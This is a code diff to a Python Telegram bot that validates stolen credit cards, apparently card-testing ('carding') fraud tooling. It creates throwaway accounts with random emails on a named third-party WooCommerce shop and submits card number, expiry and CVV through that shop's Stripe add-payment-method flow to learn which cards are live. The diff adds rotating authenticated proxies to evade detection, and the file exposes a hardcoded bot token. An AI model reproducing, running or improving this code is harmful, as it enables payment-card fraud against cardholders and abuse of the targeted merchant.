@@ -4,12 +4,30 @@ import random
 import asyncio
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
+from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
 
-bot_token = '8039426526:AAFSqWU-fRl_gwTPqYLK8yxuS0N9at1hC4s'  # <-- Replace with your actual token
-private_channel_id = -1002621183707  # Optional, for logging
+# ==== CONFIG ====
+bot_token = '8039426526:AAFSqWU-fRl_gwTPqYLK8yxuS0N9at1hC4s'  # <-- Set your Telegram Bot Token
 
 kk = "qwertyuiolmkjnhbgvfcdxszaQWEAERSTSGGZJDNFMXLXLVKPHPY1910273635519"
+
+def load_proxies(filename="proxies.txt"):
+    with open(filename) as f:
+        lines = [l.strip() for l in f if l.strip()]
+    return lines
+
+proxy_list = load_proxies()
+
+def get_random_proxy():
+    proxy_str = random.choice(proxy_list)
+    # host:port:user:pass
+    host, port, user, pwd = proxy_str.split(":")
+    proxy_fmt = f"http://{user}:{pwd}@{host}:{port}"
+    return {"http": proxy_fmt, "https": proxy_fmt}
+
+def get_random_email():
+    chars = "abcdefghijklmnopqrstuvwxyz1234567890"
+    return "".join(random.choice(chars) for _ in range(10)) + "@gmail.com"
 
 def extract_cc(text):
     return re.findall(r"\b\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b", text)
@@ -19,7 +37,6 @@ def get_bin_info(bin_number):
         url = f"https://bins.antipublic.cc/bins/{bin_number}"
         resp = requests.get(url, timeout=10)
         if resp.status_code == 200:
-            # Example: 542550: MASTERCARD, CREDIT, SG, CITIBANK SINGAPORE LIMITED, SINGAPORE, CITIBANK SINGAPORE LIMITED, SG
             line = resp.text.strip().split('\n')[0]
             parts = [p.strip() for p in line.split(",")]
             if len(parts) >= 6:
@@ -61,6 +78,7 @@ def format_cc_result(ccx, status, site_response, bin_info, country, issuer, card
 def chk(ccx):
     def get_fresh_session():
         s = requests.session()
+        s.proxies = get_random_proxy()
         r = (
             random.choice(kk)*2 +
             random.choice(kk)*2 +
@@ -71,30 +89,31 @@ def chk(ccx):
             random.choice(kk) +
             random.choice(kk)
         )
+        email = get_random_email()
         url = "https://infiniteautowerks.com/my-account/"
         headers = {
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "accept-language": "en-US,en;q=0.9,ar;q=0.8",
         }
-        resp = s.get(url, headers=headers)
+        resp = s.get(url, headers=headers, timeout=20)
         try:
             nonce = resp.text.split('name="woocommerce-register-nonce" value=')[1].split('"')[1]
         except Exception:
             return None, None, None
 
         payload = {
-            "email": f"{r}123@gmail.com",
+            "email": email,
             "woocommerce-register-nonce": nonce,
             "_wp_http_referer": "/my-account/",
             "register": "Register",
         }
-        s.post(url, data=payload, headers=headers, cookies=s.cookies)
+        s.post(url, data=payload, headers=headers, cookies=s.cookies, timeout=20)
         return s, headers, s.cookies
 
     def get_payment_nonce(session, headers, cookies):
         url = "https://infiniteautowerks.com/my-account/add-payment-method/"
-        resp = session.get(url, headers=headers, cookies=cookies)
+        resp = session.get(url, headers=headers, cookies=cookies, timeout=20)
         try:
             nonce1 = resp.text.split('createAndConfirmSetupIntentNonce":')[1].split('"')[1]
         except Exception:
@@ -145,7 +164,7 @@ def chk(ccx):
         "accept-language": "en-US,en;q=0.9,ar;q=0.8",
     }
 
-    response = requests.post(url, data=payload, headers=stripe_headers)
+    response = requests.post(url, data=payload, headers=stripe_headers, proxies=session.proxies, timeout=20)
     try:
         tok = response.json()["id"]
     except Exception as e:
@@ -166,7 +185,7 @@ def chk(ccx):
         "referer": "https://infiniteautowerks.com/my-account/add-payment-method/",
         "accept-language": "en-US,en;q=0.9,ar;q=0.8",
     }
-    resp = session.post(url, data=payload, headers=confirm_headers, cookies=cookies)
+    resp = session.post(url, data=payload, headers=confirm_headers, cookies=cookies, proxies=session.proxies, timeout=20)
     txt = resp.text
 
     # Analyze response and message
@@ -190,8 +209,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
         "<b>Welcome!\n\n"
         "To check a card, use the command:\n"
-        "<code>/chk 4242424242424242|12|25|123</code>\n"
-        "Or simply send a card like <code>4242424242424242|12|25|123</code> and I'll check it!\n\n"
+        "<code>/chk 4242424242424242|12|25|123</code>\n\n"
         "🟢 <b>Stripe</b> is live!\n"
         "🚧 More gateways coming soon...\n"
         "</b>"
@@ -241,36 +259,11 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(formatted_msg, parse_mode="HTML")
         await asyncio.sleep(15)
 
-async def auto_check_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text
-    cc_list = extract_cc(text)
-    if not cc_list:
-        return  # Not a card, ignore
-
-    user_first_name = update.effective_user.first_name
-    for ccx in cc_list:
-        bin_info = ccx.split('|')[0][:6]
-        bin_data = await asyncio.to_thread(get_bin_info, bin_info)
-        status, site_response = await asyncio.to_thread(chk, ccx)
-        formatted_msg = format_cc_result(
-            ccx=ccx,
-            status=status,
-            site_response=site_response,
-            bin_info=bin_info,
-            country=bin_data["country"],
-            issuer=bin_data["issuer"],
-            card_type=bin_data["type"],
-            user_first_name=user_first_name
-        )
-        await update.message.reply_text(formatted_msg, parse_mode="HTML")
-        await asyncio.sleep(15)
-
 def main():
     app = Application.builder().token(bot_token).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("chk", chk_command))
     app.add_handler(CallbackQueryHandler(more_gateway_callback, pattern="^more_gateway$"))
-    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), auto_check_message))
     app.run_polling()
 
 if __name__ == "__main__":
